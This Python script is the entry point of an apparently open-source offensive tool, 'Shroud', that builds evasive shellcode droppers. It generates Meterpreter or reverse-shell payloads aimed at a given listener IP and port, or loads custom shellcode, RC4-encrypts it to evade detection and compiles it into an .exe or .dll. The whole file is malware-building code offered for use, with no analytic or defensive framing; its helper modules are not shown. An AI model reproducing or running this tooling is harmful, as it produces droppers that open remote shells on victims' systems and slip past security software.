#!/usr/bin/python3
import argparse
import subprocess
import os
from itertools import cycle
from RC4Encryption import RC4Encryption
from modules.util import *
from modules.encryption import *
from modules.write import *

print("""
.▄▄ ·   ▄ .▄ ▄▄▄        ▄• ▄▌ ·▄▄▄▄  
▐█ ▀.  ██▪▐█ ▀▄ █· ▄█▀▄ █▪██▌ ██· ██ 
▄▀▀▀█▄ ██▀▀█ ▐▀▀▄ ▐█▌.▐▌█▌▐█▌ ▐█▪ ▐█▌
▐█▄▪▐█ ██▌▐▀ ▐█•█▌▐█▌.▐▌▐█▄█▌ ██. ██ 
 ▀▀▀▀  ▀▀▀ · .▀  ▀ ▀█▄▀▪ ▀▀▀  ▀▀▀▀▀•                                                                                          
			by twopoint
				  """)
parser = argparse.ArgumentParser(
                    prog='Shroud',
                    description='Generate evasive shellcode droppers.',
                    epilog='https://github.com/Jake123otte1/Shroud')

inputgroup = parser.add_argument_group('shellcode')
inputgroup = inputgroup.add_mutually_exclusive_group(required=True)

# Shellcode input group
inputgroup.add_argument('--file', help='Custom shellcode file')
inputgroup.add_argument('--msf', help='Generate a Meterpreter template payload.', action="store_true")
inputgroup.add_argument('--shell', help='Generate a reverse shell (cmd) template payload.',  action="store_true")

# Templating options
parser.add_argument('-L', '--lhost', help='Listener IP for templates.')
parser.add_argument('-P', '--lport', help='Listener port for templates.')

# Other options
parser.add_argument('--dont-encrypt', help='Don\'t encrypt the payload.', action="store_true")
parser.add_argument('output', help='Output dropper file. Specify .exe or .dll.')

args = parser.parse_args()

def main():

	#### Generate templates if necessary
	if args.msf or args.shell:
		print(f"[*] Generating shellcode from template. (IP: {args.lhost}, PORT: {args.lport})")
		generateTemplate(args)
		shellcode = readShellcode("./output/shellcode.raw")
	elif args.file:
		print(f"[*] Using custom shellcode file {args.file}")
		shellcode = readShellcode(args.file)

	#### Encrypt payload
	if args.dont_encrypt: # DON'T ENCRYPT
		print("[!] NOT ENCRYPTING PAYLOAD...")
		writePayload(shellcode, None)

	else: # DEFAULT - RC4
		print("[~] Encrypting payload with RC4...")
		shellcode, encKey, firstbyte = encryptRC4(shellcode)
		writePayload(shellcode, rc4Blob(encKey,firstbyte))

	#### Compile
	print("[~] Compiling...")
	compile(args)
	

if __name__ == '__main__':
	main()
